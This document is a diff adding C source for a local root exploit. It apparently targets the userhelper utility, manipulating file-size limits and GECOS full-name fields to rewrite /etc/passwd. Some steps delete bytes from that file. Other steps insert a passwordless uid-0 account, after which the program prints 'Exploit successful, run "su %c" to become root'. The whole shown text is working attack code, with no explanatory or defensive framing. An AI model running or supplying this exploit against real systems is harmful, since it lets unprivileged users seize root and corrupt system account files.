+        char *const tp = contents + st.st_size-1;
+        *tp = '\0';
+        if (tp <= cp) die();
+        if (tp - cp > fullname_max) cp = tp - fullname_max;
+        cp = strpbrk(cp, "\n:, ");
+        if (cp == NULL) die();
+
+        const ssize_t fullname_len = tp - cp;
+        if (fullname_len >= GECOS_LENGTH) die();
+        if (fullname_len <= 0) die();
+
+        printf("Deleting %zd bytes from \"%s\"\n", fullname_len, PASSWD);
+
+        struct userhelper *const uh = &userhelpers[0];
+        memset(uh->gecos.full_name, 'A', fullname_len);
+        uh->fsizelim = st.st_size;
+        forkstop_userhelper(uh);
+        continue_userhelper(uh);
+
+        uh->fsizelim = RLIM_INFINITY;
+        forkstop_userhelper(uh);
+        continue_userhelper(uh);
+    }
+    free(contents);
+}
+
+static size_t passwd_fsize;
+static int generate_userhelpers(const char *);
+#define IS_USER_LAST "last user in passwd file?"
+
+static char candidate_users[256];
+static char superuser_elect;
+
+int
+main(void)
+{
+    create_backup_of_passwd_file();
+
+    { char candidate[] = "a";
+    for (; candidate[0] <= 'z'; candidate[0]++) {
+        if (getpwnam(candidate) != NULL) continue;
+        strcat(candidate_users, candidate);
+    } }
+    if (candidate_users[0] == '\0') die();
+
+    const struct passwd *const pwd = getpwuid(getuid());
+    if ((pwd == NULL) || (pwd->pw_name == NULL)) die();
+    xsnprintf(my.username, sizeof(my.username), "%s", pwd->pw_name);
+    gecos_parse(pwd->pw_gecos, &my.gecos);
+
+    if (fputs("Please enter your password:\n", stdout) == EOF) die();
+    if (fgets(my.password, sizeof(my.password), stdin) == NULL) die();
+    char *const newline = strchr(my.password, '\n');
+    if (newline == NULL) die();
+    *newline = '\0';
+
+    { struct userhelper *const uh = &userhelpers[0];
+    uh->fsizelim = RLIM_INFINITY;
+    forkstop_userhelper(uh);
+    continue_userhelper(uh); }
+
+    retry:
+    if (generate_userhelpers(IS_USER_LAST)) {
+        struct userhelper *const uh1 = &userhelpers[1];
+        strcpy(uh1->gecos.full_name, "\n");
+        uh1->fsizelim = passwd_fsize + 1;
+
+        struct userhelper *const uh0 = &userhelpers[0];
+        uh0->fsizelim = passwd_fsize;
+
+        forkstop_userhelper(uh1), forkstop_userhelper(uh0);
+        continue_userhelper(uh1), continue_userhelper(uh0);
+        if (generate_userhelpers(IS_USER_LAST)) die();
+    }
+
+    static const char a[] = "?::0:0::/:";
+    printf("Attempting to add \"%s\" to \"%s\"\n", a, PASSWD);
+
+    const int n = generate_userhelpers(a);
+    if (n == -1) {
+        static int retries;
+        if (retries++) die();
+        memset(userhelpers, 0, sizeof(userhelpers));
+        delete_lines_from_passwd_file();
+        goto retry;
+    }
+    if (n <= 0) die();
+    if (n >= GECOS_LENGTH) die();
+    if (superuser_elect == '\0') die();
+
+    int i;
+    for (i = n; --i >= 0; ) {
+        printf("Starting and stopping userhelper #%d\n", i);
+        forkstop_userhelper(&userhelpers[i]);
+    }
+    for (i = n; --i >= 0; ) {
+        printf("Continuing stopped userhelper #%d\n", i);
+        continue_userhelper(&userhelpers[i]);
+    }
+    printf("Exploit successful, run \"su %c\" to become root\n",
+        (int)superuser_elect);
+
+    { struct userhelper *const uh = &userhelpers[0];
+    uh->fsizelim = RLIM_INFINITY;
+    uh->gecos = my.gecos;
+    forkstop_userhelper(uh);
+    continue_userhelper(uh); }
+
+    exit(EXIT_SUCCESS);
+}
+
+static void
+generate_fullname(char *const fullname, const ssize_t fullname_len,
+    const char c)
+{
+    if (fullname == NULL) die();
+    if (fullname_len < 0) die();
+    if (fullname_len >= GECOS_LENGTH) die();
+
+    memset(fullname, 'A', fullname_len);
+
+    if (fullname_len > 0 && strchr(GECOS_BADCHARS, c) == NULL) {
+        if (!isascii((unsigned char)c)) die();
+        if (!isgraph((unsigned char)c)) die();
+        fullname[fullname_len-1] = c;
+    }
+}
+
+static size_t siteinfo_len;
+static size_t fullname_off;
+
+static size_t before_fullname_len;
+static char * before_fullname;
+
+static size_t after_fullname_len;
+static char * after_fullname;
+
+static int
+generate_userhelper(const char *const a, const int i, char *const contents)
+{
+    if (i < 0) {
+        if (i != -1) die();
+        return 0;
+    }
+    if (a == NULL) die();
+    if ((unsigned int)i >= strlen(a)) die();
+    if (contents == NULL) die();
+
+    const char _c = a[i];
+    const bool is_user_wildcard = (_c == '?');
+    const char c = (is_user_wildcard ? candidate_users[0] : _c);
+    if (c == '\0') die();
+
+    const size_t target = passwd_fsize-1 + i;
+    const rlim_t fsizelim = (a[i+1] == '\0') ? RLIM_INFINITY : target+1;
+    if (fsizelim < passwd_fsize) die();
+
+    const size_t contents_len = strlen(contents);
+    if (contents_len < passwd_fsize) die();
+    if (contents_len <= fullname_off) die();
+
+    char *const fullname = contents + fullname_off;
+    if (memcmp(fullname - before_fullname_len,
+         before_fullname, before_fullname_len) != 0) die();
+
+    const char *rest = strchr(fullname, '\n');
+    if (rest == NULL) die();
+    rest++;
+
+    const ssize_t fullname_len = (rest - fullname) - after_fullname_len;
+    if (fullname_len >= GECOS_LENGTH) die();
+    if (fullname_len < 0) die();
+
+    if (rest[-1] != '\n') die();
+    generate_fullname(fullname, fullname_len, c);
+    memcpy(fullname + fullname_len, after_fullname, after_fullname_len);
+    if (rest[-1] != '\n') die();
+
+    if (memcmp(rest - after_fullname_len,
+      after_fullname, after_fullname_len) != 0) die();
+
+    size_t offset;
+    for (offset = fullname_off; offset < contents_len; offset++) {
+
+        const char x = contents[offset];
+        if (x == '\0') die();
+        if (is_user_wildcard) {
+            if (strchr(candidate_users, x) == NULL) continue;
+            superuser_elect = x;
+        } else {
+            if (x != c) continue;
+        }
+
+        const ssize_t new_fullname_len = fullname_len + (target - offset);
+        if (new_fullname_len < 0) continue; /* gecos_size() > GECOS_LENGTH */
+        if (4 + new_fullname_len + siteinfo_len + 1 > GECOS_LENGTH) continue;
+
+        if (offset < fullname_off + fullname_len) {
+            if (offset != fullname_off + fullname_len-1) die();
+            if (new_fullname_len == 0) continue;
+        }
+        if (offset >= contents_len-1) {
+            if (offset != contents_len-1) die();
+            if (fsizelim != RLIM_INFINITY) continue;
+        }
+
+        { char *const new_contents = xmalloc(contents_len+1 + GECOS_LENGTH);
+
+        memcpy(new_contents, contents, fullname_off);
+        generate_fullname(new_contents + fullname_off, new_fullname_len, c);
+        memcpy(new_contents + fullname_off + new_fullname_len,
+                   contents + fullname_off + fullname_len,
+                   contents_len+1 - (fullname_off + fullname_len));
+
+        if (strlen(new_contents) != contents_len +
+                (new_fullname_len - fullname_len)) die();
+
+        if (fsizelim != RLIM_INFINITY) {
+            if (fsizelim >= strlen(new_contents)) die();
+            if (fsizelim >= contents_len) die();
+            memcpy(new_contents + fsizelim,
+                       contents + fsizelim,
+                       contents_len+1 - fsizelim);
+        }
+
+        const int err = generate_userhelper(a, i-1, new_contents);
+        free(new_contents);
+        if (err < 0) continue; }
+
+        if (i >= GECOS_LENGTH) die();
+        struct userhelper *const uh = &userhelpers[i];
+        memset(uh, 0, sizeof(*uh));
+
+        uh->fsizelim = fsizelim;
+        if (new_fullname_len >= GECOS_LENGTH) die();
+        generate_fullname(uh->gecos.full_name, new_fullname_len, c);
+        return 0;
+    }
+    return -1;
+}
+
+static int
+generate_userhelpers(const char *const _a)
+{
+    char a[GECOS_LENGTH];
+    if (_a == NULL) die();
+    const int n = xsnprintf(a, sizeof(a), "\n%s\n", _a);
+    if (n >= GECOS_LENGTH) die();
+    if (n <= 0) die();
+
+    const int fd = xopen(PASSWD, O_RDONLY);
+    struct stat st;
+    if (fstat(fd, &st) != 0) die();
+    if (st.st_size >= 10*1024*1024) die();
+    if (st.st_size <= 0) die();
+    passwd_fsize = st.st_size;
+
+    char *const contents = xmalloc(passwd_fsize + 1);
+    if (read(fd, contents, passwd_fsize) != (ssize_t)passwd_fsize) die();
+    xclose(fd);
+    contents[passwd_fsize] = '\0';
+    if (strlen(contents) != passwd_fsize) die();
+    if (contents[passwd_fsize-1] != '\n') die();
+
+    char fragment[64];
+    xsnprintf(fragment, sizeof(fragment), "\n%s:", my.username);
+    const char *line = strstr(contents, fragment);
+    if (line == NULL) die();
+    line++;
+
+    const char *rest = strchr(line, '\n');
+    if (rest == NULL) die();
+    if (rest <= line) die();
+    rest++;
+
+    if (strcmp(_a, IS_USER_LAST) == 0) {
+        const bool is_user_last = (*rest == '\0');
+        free(contents);
+        return is_user_last;
+    }
+
+    unsigned int i;
+    const char *field = line;
+
+    for (i = 0; i <= 5; i++) {
+        const char *const field_end = strchr(field, ':');
+        if (field_end == NULL) die();
+        if (field_end >= rest) die();
+        const size_t field_len = field_end - field;
+
+        switch (i) {
+        case 0:
+            if (field_len != strlen(my.username)) die();
+            if (memcmp(field, my.username, field_len) != 0) die();
+            break;
+        case 1:
+            if (*field != 'x') die();
+            break;
+        case 2:
+            if (strtoimax(field, NULL, 10) != getuid()) die();
+            break;
+        case 3:
+            if (strtoimax(field, NULL, 10) != getgid()) die();
+            break;
+        case 4:
+            {
+                char assembled[GECOS_LENGTH];
+                xsnprintf(assembled, sizeof(assembled),
+                            "%.*s", (int)field_len, field);
+                if (strlen(assembled) != field_len) die();
+
+                struct gecos_data gecos;
+                memset(&gecos, 0, sizeof(gecos));
+                xsnprintf(gecos.site_info, sizeof(gecos.site_info),
+                                         "%s", my.gecos.site_info);
+                if (strcmp(assembled, gecos_assemble(&gecos)) != 0) die();
+            }
+
+            siteinfo_len = strlen(my.gecos.site_info);
+            fullname_off = field - contents;
+
+            before_fullname_len = field - line;
+            before_fullname = xstrndup(line, before_fullname_len);
+
+            after_fullname_len = rest - field;
+            after_fullname = xstrndup(field, after_fullname_len);
+            break;
+
+        case 5:
+            if (*field != '/') die();
+            break;
+        default:
+            die();
+        }
+        field = field_end + 1;
+    }
+
+    const int err = generate_userhelper(a, n-1, contents);
+
+    free(before_fullname), before_fullname = NULL;
+    free(after_fullname), after_fullname = NULL;
+    free(contents);
+
+    return (err < 0) ? -1 : n;
+}
